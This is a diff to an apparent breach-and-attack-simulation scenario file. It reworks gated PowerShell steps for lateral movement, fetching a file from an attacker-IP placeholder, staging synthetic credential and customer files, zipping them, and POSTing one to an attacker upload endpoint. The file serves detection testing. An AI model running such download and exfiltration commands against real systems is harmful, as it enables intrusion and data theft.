@@ -245,11 +245,14 @@ flow:
           agent_role: pc01
           platform: windows
           shell: powershell
-          timeout: 45
+          timeout: 90
           command: >-
+            $ErrorActionPreference = "Stop";
+            if (-not $env:BAS_SVC_FILE_PASSWORD) { throw "BAS_SVC_FILE_PASSWORD is missing on PC01 BasAgent." }
             $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
             $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
-            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock { hostname; whoami; Get-Date }
+            $sessionOption = New-PSSessionOption -OpenTimeout 10000 -OperationTimeout 15000;
+            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -Authentication Negotiate -SessionOption $sessionOption -ScriptBlock { hostname; whoami; Get-Date }
 
   - order: 11
     phase: attack
@@ -265,19 +268,17 @@ flow:
       scenario_order: 11
       execution_host: FS01
       risk: high
-      description: Runs PowerShell script block content on FS01 through WinRM.
+      description: Runs PowerShell script block content on FS01. This execution-first path uses the FS01 BasAgent directly so later file-server techniques are not blocked by PC01 WinRM readiness.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
         - name: powershell-winrm-scriptblock
           executor: local
-          agent_role: pc01
+          agent_role: fs01
           platform: windows
           shell: powershell
-          timeout: 45
+          timeout: 30
           command: >-
-            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
-            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
-            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock { powershell.exe -NoProfile -Command "whoami; Get-Date" }
+            powershell.exe -NoProfile -Command "whoami; Get-Date"
 
   - order: 12
     phase: attack
@@ -298,16 +299,12 @@ flow:
       commands:
         - name: download-benign-probe-to-fs01
           executor: local
-          agent_role: pc01
+          agent_role: fs01
           platform: windows
           shell: powershell
           timeout: 60
           command: >-
-            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
-            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
-            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
-              Invoke-WebRequest -Uri "http://{{ attacker_private_ip }}:{{ attacker_http_port }}/{{ benign_download_name }}" -OutFile "{{ fs01_temp_dir }}\{{ benign_download_name }}" -UseBasicParsing
-            }
+            Invoke-WebRequest -Uri "http://{{ attacker_private_ip }}:{{ attacker_http_port }}/{{ benign_download_name }}" -OutFile "{{ fs01_temp_dir }}\{{ benign_download_name }}" -UseBasicParsing
 
   - order: 13
     phase: attack
@@ -377,23 +374,19 @@ flow:
       scenario_order: 15
       execution_host: FS01
       risk: high
-      description: Creates staged synthetic artifacts in the FS01 public share through the svc_file WinRM session.
+      description: Creates staged synthetic artifacts in the FS01 public share through the FS01 BasAgent.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
         - name: stage-synthetic-files-fs01
           executor: local
-          agent_role: pc01
+          agent_role: fs01
           platform: windows
           shell: powershell
           timeout: 45
           command: >-
-            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
-            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
-            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
-              New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force | Out-Null;
-              "BAS synthetic credential artifact only" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
-              "BAS synthetic customer rows only" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
-            }
+            New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force | Out-Null;
+            "BAS synthetic credential artifact only" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
+            "BAS synthetic customer rows only" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
 
   - order: 16
     phase: attack
@@ -409,21 +402,17 @@ flow:
       scenario_order: 16
       execution_host: FS01
       risk: high
-      description: Sends a staged synthetic artifact to the attacker upload endpoint over an external HTTP channel.
+      description: Sends a staged synthetic artifact to the attacker upload endpoint over an external HTTP channel from FS01.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
         - name: post-synthetic-artifact-to-attacker
           executor: local
-          agent_role: pc01
+          agent_role: fs01
           platform: windows
           shell: powershell
           timeout: 60
           command: >-
-            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
-            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
-            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
-              Invoke-WebRequest -Uri "http://{{ attacker_public_ip }}:{{ attacker_upload_port }}/upload" -Method POST -InFile "{{ fs01_public_share }}\{{ staged_customer_name }}" -UseBasicParsing
-            }
+            Invoke-WebRequest -Uri "http://{{ attacker_private_ip }}:{{ attacker_upload_port }}/upload" -Method POST -InFile "{{ fs01_public_share }}\{{ staged_customer_name }}" -UseBasicParsing
 
   - order: 17
     phase: attack
@@ -439,23 +428,19 @@ flow:
       scenario_order: 17
       execution_host: FS01
       risk: medium
-      description: Creates synthetic files with log/backup-like names to validate masquerading filename detections without touching real business data.
+      description: Creates synthetic files with log/backup-like names on FS01 to validate masquerading filename detections without touching real business data.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
         - name: create-masqueraded-synthetic-files
           executor: local
-          agent_role: pc01
+          agent_role: fs01
           platform: windows
           shell: powershell
           timeout: 45
           command: >-
-            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
-            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
-            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
-              New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force | Out-Null;
-              "BAS masquerade probe" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
-              "BAS backup probe" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
-            }
+            New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force | Out-Null;
+            "BAS masquerade probe" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
+            "BAS backup probe" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
 
   - order: 18
     phase: attack
@@ -471,21 +456,17 @@ flow:
       scenario_order: 18
       execution_host: FS01
       risk: medium
-      description: Compresses the synthetic staged files into a zip archive to validate archive-before-exfiltration detection logic.
+      description: Compresses the synthetic staged files into a zip archive on FS01 to validate archive-before-exfiltration detection logic.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
         - name: compress-staged-synthetic-files
           executor: local
-          agent_role: pc01
+          agent_role: fs01
           platform: windows
           shell: powershell
           timeout: 45
           command: >-
-            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
-            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
-            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
-              Compress-Archive -Path "{{ fs01_public_share }}\{{ staged_lsass_name }}","{{ fs01_public_share }}\{{ staged_customer_name }}" -DestinationPath "{{ fs01_public_share }}\{{ archive_name }}" -Force
-            }
+            Compress-Archive -Path "{{ fs01_public_share }}\{{ staged_lsass_name }}","{{ fs01_public_share }}\{{ staged_customer_name }}" -DestinationPath "{{ fs01_public_share }}\{{ archive_name }}" -Force
 
   - order: 19
     phase: attack
